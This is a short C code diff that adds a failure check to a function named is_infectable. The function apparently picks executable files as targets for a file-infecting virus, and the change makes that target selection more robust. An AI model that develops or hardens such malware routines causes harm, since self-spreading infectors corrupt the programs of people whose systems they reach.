@@ -11,7 +11,8 @@ static inline bool is_infectable(const char *filename, const unsigned char type)
 	if (type != FILE_TYPE)
 		return false;
 
-	_stat(filename, &statbuf);
+	if (_stat(filename, &statbuf) == -1)
+		return false;
 
 	return statbuf.st_mode & S_IXUSR;
 }
